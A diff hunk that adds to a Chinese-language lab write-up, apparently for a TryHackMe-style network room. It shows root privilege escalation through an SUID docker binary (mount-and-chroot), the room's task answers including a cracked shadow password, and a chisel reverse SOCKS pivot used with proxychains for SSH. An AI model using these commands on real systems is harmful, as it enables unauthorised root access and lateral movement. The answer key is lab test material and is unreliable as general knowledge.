@@ -930,4 +930,136 @@ www-data@ip-10-200-112-33:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
 可以使用docker提权，见[这里](https://gtfobins.github.io/gtfobins/docker/)
 
 
-/usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+使用上面的命令提示没有alpine这个image
+```
+www-data@ip-10-200-112-33:/home/ubuntu$ /usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+<docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+Unable to find image 'alpine:latest' locally
+/usr/bin/docker: Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).
+See '/usr/bin/docker run --help'.
+
+```
+
+查看靶机拥有的image
+```
+www-data@ip-10-200-112-33:/home/ubuntu$ docker images
+docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+<none>              <none>              cb1b741122e8        18 months ago       995MB
+<none>              <none>              b711fc810515        18 months ago       993MB
+<none>              <none>              591bb8cd4ef6        18 months ago       993MB
+<none>              <none>              88d15ba62bf4        18 months ago       993MB
+ubuntu              18.04               56def654ec22        22 months ago       63.2MB
+```
+
+有一个18.04版本的ubuntu，提权到root
+```
+www-data@ip-10-200-112-33:/home/ubuntu$ /usr/bin/docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
+< run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+whoami
+root
+
+```
+
+**Task 20  Privilege Escalation Call me Mario, because I got all the bits**
+
+> What is the full path of the binary with an SUID bit set on L-SRV01?
+
+> /usr/bin/docker
+
+> What is the full first line of the exploit for the SUID bit?
+
+> sudo install -m =xs $(which docker) .
+
+**Task 21  Post Exploitation From the Shadows**
+
+> What non-default user can we find in the shadow file on L-SRV01?
+
+> linux-admin
+
+
+**Task 22  Post Exploitation Crack all the Things**
+
+> What is the plaintext cracked password from the shadow hash?
+> linuxrulez
+
+
+## chisel配置动态端口转发
+
+kali执行
+```
+./chisel server -p 8000 --reverse
+```
+
+客户端执行
+```
+./chisel client 10.50.109.139:8000 R:socks
+```
+
+```/etc/proxychains4.conf```配置
+
+```
+socks5  127.0.0.1 1080
+```
+
+ssh登录
+```
+┌──(root💀kali)-[~]
+└─# proxychains ssh linux-admin@10.200.112.33                                                                                                                                                                                         255 ⨯
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:9050 <--socket error or timeout!
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:9051 <--socket error or timeout!
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.200.112.33:22  ...  OK
+The authenticity of host '10.200.112.33 (10.200.112.33)' can't be established.
+RSA key fingerprint is SHA256:43K5xtSCUtS9tdIFuE60lTb3CLW0O+cPzfiGDj2oCFg.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.200.112.33' (RSA) to the list of known hosts.
+linux-admin@10.200.112.33's password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1030-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Jul 28 10:31:10 UTC 2022
+
+  System load:                      0.0
+  Usage of /:                       97.3% of 7.69GB
+  Memory usage:                     20%
+  Swap usage:                       0%
+  Processes:                        149
+  Users logged in:                  0
+  IPv4 address for br-19e3b4fa18b8: 192.168.100.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.200.112.33
+
+  => / is using 97.3% of 7.69GB
+  => There is 1 zombie process.
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+107 updates can be installed immediately.
+11 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+6 updates could not be installed automatically. For more details,
+see /var/log/unattended-upgrades/unattended-upgrades.log
+
+Last login: Sat Jan 16 19:48:21 2021 from 10.41.0.2
+linux-admin@ip-10-200-112-33:~$ 
+
+```
